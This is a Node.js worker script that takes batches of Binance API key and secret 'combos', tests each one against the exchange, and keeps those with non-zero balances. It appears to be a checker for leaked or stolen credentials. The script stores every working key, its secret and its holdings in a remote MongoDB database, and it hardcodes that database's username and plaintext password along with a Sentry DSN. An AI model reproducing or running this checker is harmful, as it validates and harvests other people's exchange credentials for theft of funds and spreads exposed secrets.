const { expose } = require('threads/worker')
const ccxt = require('ccxt')
const Sentry = require('@sentry/node')
const Promise = require('bluebird')
const mongoose = require('mongoose')
Sentry.init({
    dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
    integrations: [
      // enable HTTP calls tracing
      new Sentry.Integrations.Http({ tracing: true }),
    ],
  
    // Set tracesSampleRate to 1.0 to capture 100%
    // of transactions for performance monitoring.
    // We recommend adjusting this value in production
    tracesSampleRate: 1.0,
  });
  
expose(async combos => {
    console.log('tryng binance with', combos)
   
    return Promise.each(combos, async combo => {
        try {
            let binance = new ccxt.binance(combo)
            let balance = await binance.fetchBalance()
            const {free} = balance
            //console.log(free)
            console.log('worked', combo)
            let cryptos = Object.keys(free).map(k => {
                let balanceForCrypto = free[k]
                if(balanceForCrypto > 0) {
                    return {crypto: k, balance: free[k]}
                }
                else {
                    return null
                }
            }).filter(item => item !== null)
            console.log('cryptos', cryptos)
            await mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority')
            let schema = new mongoose.Schema({}, {strict: false})
            
            return mongoose.model('binanceAccounts', schema).create({
                apiKey: combo.apiKey,
                secret: combo.secret,
                cryptos
            }).then(res => res.save()).then(() => console.log('binance account added', combo))

        }
        catch(err) {
            console.log(err)

        }
    })
  
  })
